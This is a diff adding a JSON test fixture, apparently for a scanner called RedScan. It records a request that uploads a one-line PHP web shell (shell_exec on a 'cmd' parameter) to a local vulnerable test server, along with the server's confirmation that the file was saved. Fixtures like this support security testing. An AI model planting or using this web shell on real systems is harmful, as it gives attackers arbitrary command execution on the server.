@@ -1,0 +1,5 @@
+{
+  "request": "POST /vuln/upload?filename=shell.php HTTP/1.1\r\nHost: 127.0.0.1:8081\r\nUser-Agent: RedScan-Test\r\nContent-Type: application/x-httpd-php\r\nAccept: */*\r\nAuthorization: Bearer demo-token\r\nCookie: sessionid=demo123\r\n\r\n<?php echo shell_exec($_GET['cmd']); ?>",
+  "response": "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"saved\":\"/mnt/c/Users/k1rha/Desktop/CODEX/RedScan/test_vuln_target/uploads/shell.php\",\"note\":\"\",\"size\":39,\"download_hint\":\"/vuln/download?path=/mnt/c/Users/k1rha/Desktop/CODEX/RedScan/test_vuln_target/uploads/shell.php\"}",
+  "base_url": "http://127.0.0.1:8081"
+}
